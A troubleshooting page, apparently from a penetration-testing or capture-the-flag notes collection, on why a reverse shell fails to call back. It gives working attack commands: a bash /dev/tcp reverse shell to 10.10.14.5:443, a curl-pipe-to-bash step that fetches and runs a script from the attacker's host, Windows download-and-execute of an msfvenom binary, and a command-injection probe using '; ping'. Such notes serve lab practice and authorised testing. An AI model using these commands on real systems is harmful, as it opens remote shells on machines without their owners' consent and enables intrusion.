# 🧯 Reverse Shell Not Connecting

> You fired the payload but the listener stays silent. Almost always **wrong LHOST**, a **blocked egress port**, or an **OS/payload mismatch**. Work this list.

Related: [[Troubleshooting Methodology]] · [[Shells]] · [[Reverse Shell Cheat Sheet]]

---

## Check in order
1. **Listener actually up?**
```bash
ss -tlnp | grep 443
```
2. **Right LHOST?** Use your **tun0** IP, not eth0/localhost:
```bash
ip a show tun0
```
3. **Egress blocked?** Retry on a port the target is allowed out on — **443, 53, 80**:
```bash
sudo nc -lvnp 443
```
4. **OS/payload match?** Linux payload on Windows (or wrong arch) silently fails — pick the matching one-liner/binary ([[Shells]]).
5. **Encoding in web params?** URL-encode the payload (`&`, spaces, `>`, `;`).
6. **Try a different transport** (bash → python → nc → mkfifo). One may be missing on the target.

## Alternatives when one-liners fail
Host a script and pull+run it (defeats quoting issues):
```bash
echo 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' > s.sh ; python3 -m http.server 80
```
```bash
curl http://10.10.14.5/s.sh | bash        # run this on the target
```
Windows: `certutil`/`iwr` a compiled `msfvenom` exe, then execute it ([[File Transfer Cheat Sheet]]).

## Symptom table
| Symptom | Cause | Fix |
|---|---|---|
| Total silence | wrong LHOST / egress blocked | tun0 IP; port 443/53/80 |
| Connects then dies instantly | fragile shell / bad payload | different one-liner; upgrade TTY |
| "connection refused" your side | listener not running | start `nc -lvnp` first |
| Works locally, not from target | firewall egress | change port; OOB test with `ping`/`curl` to you |
| Web payload no-op | not URL-encoded / wrong lang | encode; match stack |

## Rules
- **Listener before payload.** LHOST = **tun0**. Ports **443/53/80** beat random high ports.
- Prove the target can reach you at all: `; ping -c2 10.10.14.5` (watch `tcpdump -i tun0 icmp`).
